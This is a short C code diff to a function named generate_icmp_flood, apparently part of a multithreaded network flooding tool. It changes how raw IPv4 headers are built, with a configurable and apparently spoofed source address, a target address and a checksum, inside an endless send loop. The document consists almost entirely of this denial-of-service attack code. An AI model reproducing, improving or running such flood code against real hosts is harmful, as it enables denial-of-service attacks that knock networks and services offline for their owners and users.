@@ -39,6 +39,9 @@ void *generate_icmp_flood(void *data)
 {
 	int thread_id = *((int*) data);
 	int sock = make_socket(IPPROTO_ICMP);
+	struct iphdr ipv4_h;
+	struct icmp *icmp_h_ptr;
+	ipv4_h = prepare_empty_ipv4();
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_icmp_mutex);
@@ -54,14 +57,23 @@ void *generate_icmp_flood(void *data)
 				g_icmp_now_dest_ip,
 				&g_icmp_now_port);
 		// make ipv4 header
-		struct iphdr ipv4_h;
-		ipv4_h = prepare_empty_ipv4();
+
+		/*ipv4_h = prepare_empty_ipv4();
 		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
 		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(g_icmp_now_src_ip));
 		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(g_icmp_now_dest_ip));
-		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));
+		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));*/
+
+		ipv4_h.tot_len = sizeof(struct iphdr);
+		ipv4_h.protocol = IPPROTO_ICMP;
+		ipv4_h.saddr = inet_addr(g_icmp_now_src_ip);
+		ipv4_h.daddr = inet_addr(g_icmp_now_dest_ip);
+		ipv4_h.tot_len += sizeof(struct icmp);
+		ipv4_h.check = in_cksum((__u16 *) &ipv4_h,sizeof(struct iphdr) + sizeof(struct icmp));
+
+
 		// make icmp header
-		struct icmp *icmp_h_ptr;
+
 		char buf[sizeof(struct icmp)];
 		memset(buf, 0x00, sizeof(struct icmp));
 		icmp_h_ptr = (struct icmp*) buf;
